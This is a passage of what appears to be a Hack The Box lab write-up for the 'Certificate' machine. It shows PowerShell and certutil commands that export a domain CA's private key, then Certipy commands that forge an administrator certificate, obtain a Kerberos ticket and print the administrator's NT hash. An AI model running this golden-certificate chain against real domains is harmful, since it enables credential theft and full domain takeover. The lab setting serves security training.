[[Certificate]]
```powershell
> Get-ChildItem Cert:\LocalMachine\My | ForEach-Object { $thumb = $_.Thumbprint; $subj  = $_.Subject; $hasPK = if ($_.HasPrivateKey) {'yes'} else {'no'}; $ku = ($_.Extensions | Where-Object { $_.Oid.Value -in @('2.5.29.15','2.5.29.19') } ).Format($false) ;[pscustomobject]@{Thumb=$thumb; Subject=$subj; HasPrivateKey=$hasPK; KeyUsage=$ku} } | Format-Table -AutoSize

 Thumb                                    Subject                                       HasPrivateKey KeyUsage
-----                                    -------                                       ------------- -------- 
54FA062A494DD818B02B834CB8C5C319FA4FEA8C CN=DC01.certificate.htb                       yes           Digital Signature, Key Encipherment (a0)                                                      
2F02901DCFF083ED3DBB6CB0A15BBFEE6002B1A8 CN=Certificate-LTD-CA, DC=certificate, DC=htb yes           {Digital Signature, Certificate Signing, Off-line CRL Signing, CRL Signing (86), Subject Type=CA, Path Length Constraint=None}

> Get-ChildItem Cert:\LocalMachine\My | ForEach-Object { [pscustomobject]@{Thumb=$_.Thumbprint; Exportable=$_.PrivateKey.Exportable; KeyAlgo=$_.PrivateKey.Algorithm.FriendlyNa
me} } | Format-Table # check if exportable.

```

We will try to get the private key of `CN=Certificate-LTD-CA`, 
```powershell
certutil -exportPFX My 2F02901DCFF083ED3DBB6CB0A15BBFEE6002B1A8 Certificate-LTD-CA.pfx

# Download it to my linux machine
download Certificate-LTD-CA.pfx
```

We will use this private key to sign new certificate that have the administrator upn:
```
certipy forge \                                                                              
    -ca-pfx 'Certificate-LTD-CA.pfx' -upn 'administrator@certificate.htb' \                      
    -sid 'S-1-5-21-515537669-4223687196-3249690583-500' -crl 'ldap:///' 
```

Try to auth using this forged certificate as admin:
```
certipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.10.11.71'

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb' 
[*]     SAN URL SID: 'S-1-5-21-515537669-4223687196-3249690583-500'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-500'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT                                     
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```
